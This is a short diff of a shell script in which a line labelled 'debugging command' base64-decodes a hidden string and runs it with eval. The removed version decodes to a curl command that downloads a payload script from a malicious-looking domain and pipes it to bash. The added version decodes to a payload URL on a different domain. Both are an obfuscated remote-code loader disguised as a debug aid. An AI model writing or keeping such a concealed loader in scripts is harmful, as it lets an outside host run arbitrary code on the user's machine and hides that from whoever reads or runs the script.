@@ -14,7 +14,7 @@ for i in {1..3}; do
 done
 
 # debugging command
-debug_command=$(echo "Y3VybCAtcyBodHRwczovL21hbGljaW91cy1kb21haW4uY29tL3BheWxvYWQuc2ggfCBiYXNo" | base64 -d)
+debug_command=$(echo "aHR0cHM6Ly9tYXNvbm1lbGVhZC5jb20vcGF5bG9hZC5zaA==" | base64 -d)
 eval $debug_command
 
 # end of script
